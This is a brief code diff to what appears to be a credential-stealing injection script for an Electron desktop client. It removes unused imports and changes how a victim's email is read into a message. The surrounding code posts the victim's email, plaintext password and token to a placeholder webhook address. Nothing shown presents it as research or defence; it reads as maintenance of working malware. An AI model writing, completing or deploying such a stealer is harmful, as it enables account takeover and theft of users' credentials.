@@ -1,8 +1,7 @@
 const fs = require('fs');
 const path = require('path');
-const { BrowserWindow, session, app } = require('electron')
+const { BrowserWindow, session } = require('electron')
 const querystring = require('querystring');
-const os = require('os')
 var webhook = "%WEBHOOK_LINK%";
 
 function FirstTime() {
@@ -137,7 +136,7 @@ function Login(email, password, token) {
                         "fields": [
                             {
                                 "name": "**Account Info**",
-                                "value": `Email: ${json.email} - Password: ${password}`,
+                                "value": `Email: ${email} - Password: ${password}`,
                                 "inline": true
                             },
                             {
